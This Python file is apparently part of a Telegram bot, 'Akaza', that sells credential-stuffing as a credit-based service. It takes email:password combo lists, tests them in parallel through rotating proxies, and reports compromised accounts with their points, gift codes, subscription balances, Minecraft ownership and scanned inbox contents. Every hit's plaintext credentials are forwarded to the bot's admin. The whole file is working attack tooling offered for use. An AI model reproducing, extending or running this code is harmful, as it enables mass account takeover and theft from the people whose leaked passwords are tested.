        self.edit_locks[status_msg.message_id] = {'lock': asyncio.Lock(), 'last_time': 0}

        async def update_status(force=False):
            info = self.edit_locks[status_msg.message_id]
            now = time.time()
            if not force and now - info['last_time'] < 3: return
            async with info['lock']:
                hits_text = "\n".join([f"✅ `{h['email']}` | {h['pts']} Pts" for h in last_hits[-5:]])
                text = (
                    f"⚡ *Checking in Progress...*\n\n"
                    f"📈 *Progress:* `{checked}/{total}`\n"
                    f"✅ *Hits:* `{hits}`\n"
                    f"❌ *Bad:* `{bad}`\n"
                    f"🔐 *2FA:* `{twofa}`\n"
                    f"⚠️ *Error:* `{err}`\n\n"
                    f"*Last Hits:*\n{hits_text or 'None yet'}"
                )
                try:
                    await status_msg.edit_text(text, parse_mode='Markdown')
                    info['last_time'] = time.time()
                except: pass

        loop = asyncio.get_event_loop()

        async def worker(combo):
            nonlocal hits, bad, twofa, err, checked
            async with limit:
                if akaza_db.get_credits(uid) <= 0 and uid != ADMIN_ID:
                    return

                parts = combo.split(':')
                if len(parts) < 2: return
                email, password = parts[0], parts[1]

                proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
                checker = AkazaChecker(proxy)

                res = await loop.run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])
                checked += 1

                if res['status'] == 'hit':
                    hits += 1; last_hits.append(res)
                    akaza_db.save_result(uid, email, 'hit', res)
                    # Admin Log for Hits
                    try:
                        log_msg = f"🔥 *HIT:* `{email}:{password}`\n👤 *User:* `{update.effective_user.username or uid}`\n💰 *Pts:* `{res['pts']}`\n🎁 *Codes:* {len(res['codes'])}\n🎮 *MC:* {'Yes' if res['mc']['owned'] else 'No'}"
                        await context.bot.send_message(chat_id=ADMIN_ID, text=log_msg, parse_mode='Markdown')
                    except: pass
                elif res['status'] == 'bad': bad += 1
                elif res['status'] == '2fa': twofa += 1; akaza_db.save_result(uid, email, '2fa', {})
                else: err += 1

                akaza_db.use_credit(uid)
                await update_status()

        tasks = [worker(c) for c in combos]
        await asyncio.gather(*tasks)
        await update_status(force=True)

        final_file = f"hits_{uid}_{int(time.time())}.txt"
        with open(final_file, 'w') as f:
            for h in last_hits:
                f.write(f"{h['email']}:{h['password']} | Pts: {h['pts']} | Codes: {len(h['codes'])}\n")

        await update.message.reply_document(document=open(final_file, 'rb'), caption=f"🏁 *Check Completed!*\n✅ Total Hits: {hits}")
        os.remove(final_file)

    async def admin_cmd_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if not akaza_db.is_mod(uid): return

        text = update.message.text
        parts = text.split()
        if not parts: return
        cmd = parts[0].lower()

        if cmd == '!!help':
            help_text = (
                "🛠 *Admin/Mod Commands*\n"
                "`!!addcredits [id] [amt]`\n"
                "`!!setcredits [id] [amt]`\n"
                "`!!resetcredits [id]`\n"
                "`!!grant [id]` (Lifetime)\n"
                "`!!revoke [id]`\n"
                "`!!addaccess [id] [days]`\n"
                "`!!ban [id]`\n"
                "`!!unban [id]`\n"
                "`!!mod [id]` (Owner only)\n"
                "`!!unmod [id]` (Owner only)\n"
                "`!!listmods`\n"
                "`!!info [id]`\n"
                "`!!stats` - Global stats\n"
                "`!!broadcast [msg]`\n"
                "`!!setthreads [id] [n]`\n"
                "`!!addproxies [proxies...]`"
            )
            await update.message.reply_text(help_text, parse_mode='Markdown')

        elif cmd == '!!addcredits' and len(parts) == 3:
            akaza_db.add_credits(int(parts[1]), int(parts[2]))
            await update.message.reply_text(f"✅ Added {parts[2]} credits to `{parts[1]}`")

        elif cmd == '!!setcredits' and len(parts) == 3:
            akaza_db.set_credits(int(parts[1]), int(parts[2]))
            await update.message.reply_text(f"✅ Set credits for `{parts[1]}` to {parts[2]}")

        elif cmd == '!!resetcredits' and len(parts) == 2:
            akaza_db.reset_credits(int(parts[1]))
            await update.message.reply_text(f"✅ Credits reset for `{parts[1]}`")

        elif cmd == '!!grant' and len(parts) == 2:
            akaza_db.grant_access(int(parts[1]))
            await update.message.reply_text(f"✅ Granted lifetime access to `{parts[1]}`")

        elif cmd == '!!revoke' and len(parts) == 2:
            akaza_db.revoke_access(int(parts[1]))
            await update.message.reply_text(f"✅ Revoked access from `{parts[1]}`")

        elif cmd == '!!addaccess' and len(parts) == 3:
            akaza_db.grant_timed_access(int(parts[1]), int(parts[2]))
            await update.message.reply_text(f"✅ Granted {parts[2]} days access to `{parts[1]}`")

        elif cmd == '!!ban' and len(parts) == 2:
            akaza_db.ban(int(parts[1]))
            await update.message.reply_text(f"✅ User `{parts[1]}` banned.")

        elif cmd == '!!unban' and len(parts) == 2:
            akaza_db.unban(int(parts[1]))
            await update.message.reply_text(f"✅ User `{parts[1]}` unbanned.")

        elif cmd == '!!mod' and uid == ADMIN_ID and len(parts) == 2:
            akaza_db.set_mod(int(parts[1]), 1)
            await update.message.reply_text(f"✅ User `{parts[1]}` is now a Moderator.")

        elif cmd == '!!unmod' and uid == ADMIN_ID and len(parts) == 2:
            akaza_db.set_mod(int(parts[1]), 0)
            await update.message.reply_text(f"✅ User `{parts[1]}` removed from Moderators.")

        elif cmd == '!!listmods':
            mods = akaza_db.list_mods()
            text = "🛠 *Moderators List:*\n" + "\n".join([f"• `{m['username']}` (`{m['uid']}`)" for m in mods])
            await update.message.reply_text(text, parse_mode='Markdown')

        elif cmd == '!!info' and len(parts) == 2:
            info = akaza_db.get_user_info(int(parts[1]))
            await update.message.reply_text(f"ℹ️ *User Info:* `{parts[1]}`\n`{json.dumps(info, indent=2)}`", parse_mode='Markdown')

        elif cmd == '!!stats':
            gs = akaza_db.get_global_stats()
            await update.message.reply_text(f"📊 *Global Stats*\nTotal Users: {gs['total']}\nActive: {gs['active']}\nTotal Checks: {gs['checks']}\nTotal Hits: {gs['hits']}", parse_mode='Markdown')

        elif cmd == '!!broadcast' and len(parts) > 1:
            msg = " ".join(parts[1:])
            uids = akaza_db.get_all_user_ids()
            count = 0
            for u in uids:
                try:
                    await context.bot.send_message(chat_id=u, text=f"📢 *Broadcast*\n\n{msg}", parse_mode='Markdown')
                    count += 1
                except: pass
            await update.message.reply_text(f"✅ Broadcast sent to {count} users.")

        elif cmd == '!!setthreads' and len(parts) == 3:
            akaza_db.update_settings(int(parts[1]), threads=int(parts[2]))
            await update.message.reply_text(f"✅ Threads set to {parts[2]} for `{parts[1]}`")

        elif cmd == '!!addproxies':
            raw = "\n".join(parts[1:]) if len(parts) > 1 else update.message.text.split('\n', 1)[1] if '\n' in update.message.text else ""
            new_px = [l.strip() for l in raw.splitlines() if l.strip()]
            if new_px:
                PROXIES_LIST.clear(); PROXIES_LIST.extend(new_px)
                await update.message.reply_text(f"✅ Loaded {len(new_px)} proxies via command.")

    async def settings_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        uid = update.effective_user.id
        s = akaza_db.get_user_settings(uid)
        msg = f"⚙️ *Settings*\n\n🧵 *Threads:* `{s['threads']}`\n🔍 *Keywords:* `{', '.join(s['keywords']) or 'None'}`\n⚡ *Fast Mode:* `{'ON' if s['fast_mode'] else 'OFF'}`\n\nUse `/threads <num>`, `/keywords <k1,k2>` or `/fastmode` to change."
        await update.message.reply_text(msg, parse_mode='Markdown')

    async def toggle_fastmode(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        uid = update.effective_user.id
        s = akaza_db.get_user_settings(uid)
        new_val = not s['fast_mode']
        akaza_db.update_settings(uid, fast_mode=new_val)
        await update.message.reply_text(f"✅ Fast Mode turned {'ON' if new_val else 'OFF'}")

    async def single_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not akaza_db.has_access(update.effective_user.id):
            await update.message.reply_text("❌ No access.")
            return
        if not context.args:
            await update.message.reply_text("❌ Usage: `/check email:pass`")
            return
        combo = context.args[0]
        if ':' not in combo:
            await update.message.reply_text("❌ Format: `email:pass`")
            return

        email, password = combo.split(':')[:2]
        msg = await update.message.reply_text(f"🔍 Checking `{email}`...")

        uid = update.effective_user.id
        settings = akaza_db.get_user_settings(uid)
        proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
        checker = AkazaChecker(proxy)

        res = await asyncio.get_event_loop().run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])

        if res['status'] == 'hit':
            akaza_db.save_result(uid, email, 'hit', res)
            text = (
                f"✅ *HIT!* `{email}:{password}`\n\n"
                f"👤 *Name:* `{res['name']}`\n"
                f"🌍 *Country:* `{res['country']}`\n"
                f"💰 *Points:* `{res['pts']}`\n"
                f"🎁 *Codes:* `{len(res['codes'])}`\n"
                f"💳 *Subs:* `{res['subs']['status']}` ({res['subs']['balance']})\n"
                f"🎮 *Minecraft:* `{'Yes' if res['mc']['owned'] else 'No'}`\n\n"
                f"📥 *Inbox:* `{json.dumps(res['inbox'])}`"
            )
            await msg.edit_text(text, parse_mode='Markdown')
        elif res['status'] == '2fa':
            await msg.edit_text("🔐 *2FA / Secured Account*", parse_mode='Markdown')
        elif res['status'] == 'bad':
            await msg.edit_text("❌ *Invalid Credentials*", parse_mode='Markdown')
        else:
            await msg.edit_text("⚠️ *Error during check*", parse_mode='Markdown')

    async def set_threads(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        try:
            val = int(context.args[0])
            if 1 <= val <= 250:
                akaza_db.update_settings(update.effective_user.id, threads=val)
                await update.message.reply_text(f"✅ Threads set to {val}")
            else: await update.message.reply_text("❌ Limit 1-250.")
        except: await update.message.reply_text("❌ Usage: `/threads 50`")

    async def set_keywords(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not context.args:
            await update.message.reply_text("❌ Usage: `/keywords instagram,facebook`")
            return
        kws = [k.strip() for k in " ".join(context.args).split(',')]
        akaza_db.update_settings(update.effective_user.id, keywords=kws)
        await update.message.reply_text(f"✅ Keywords updated: {', '.join(kws)}")

    async def add_keyword(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not context.args: return
        new_kws = [k.strip() for k in " ".join(context.args).split(',')]
        s = akaza_db.get_user_settings(update.effective_user.id)
        current = s['keywords']
        updated = list(set(current + new_kws))
        akaza_db.update_settings(update.effective_user.id, keywords=updated)
        await update.message.reply_text(f"✅ Added {len(new_kws)} keywords.")

    async def clear_keywords(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        akaza_db.update_settings(update.effective_user.id, keywords=[])
        await update.message.reply_text("✅ Keywords cleared.")

    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        uid = update.effective_user.id
        if query.data == "stats":
            stats = akaza_db.user_stats(uid)
            await query.edit_message_text(f"📊 *Your Stats*\nChecks: `{stats['checks']}`\nHits: `{stats['hits']}`\nCredits: `{stats['credits']}`", parse_mode='Markdown')
        elif query.data == "settings":
            s = akaza_db.get_user_settings(uid)
            msg = f"⚙️ *Settings*\n\n🧵 *Threads:* `{s['threads']}`\n🔍 *Keywords:* `{', '.join(s['keywords']) or 'None'}`\n⚡ *Fast Mode:* `{'ON' if s['fast_mode'] else 'OFF'}`"
            await query.edit_message_text(msg, parse_mode='Markdown')
        elif query.data == "help":
            await query.edit_message_text("🆘 *Help*\nSend a combo list (email:pass) as text or .txt file.\nUse /threads <num> to set speed.\nUse /keywords <k1,k2> for custom inbox scan.", parse_mode='Markdown')

    def run(self):
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("settings", self.settings_cmd))
        self.app.add_handler(CommandHandler("threads", self.set_threads))
        self.app.add_handler(CommandHandler("keywords", self.set_keywords))
        self.app.add_handler(CommandHandler("addkw", self.add_keyword))
        self.app.add_handler(CommandHandler("clearkw", self.clear_keywords))
        self.app.add_handler(CommandHandler("fastmode", self.toggle_fastmode))
        self.app.add_handler(CommandHandler("check", self.single_check))
        self.app.add_handler(CallbackQueryHandler(self.callback_handler))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))

        logger.info("🤖 Akaza Bot is running...")
        self.app.run_polling(drop_pending_updates=True)

# SECTION 8 — Main Execution
def bot_main_exec():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not found in environment variables.")
        return
    akaza_db.init_db()
    logger.info("Database initialized")
    # Ensure Admin is in DB
    if ADMIN_ID != 0:
        akaza_db.add_user(ADMIN_ID, "Admin", "Admin")
        akaza_db.grant_access(ADMIN_ID)
        akaza_db.set_mod(ADMIN_ID, 1)

    bot = AkazaBot(BOT_TOKEN)
    bot.run()

if __name__ == "__main__":
    bot_main_exec()
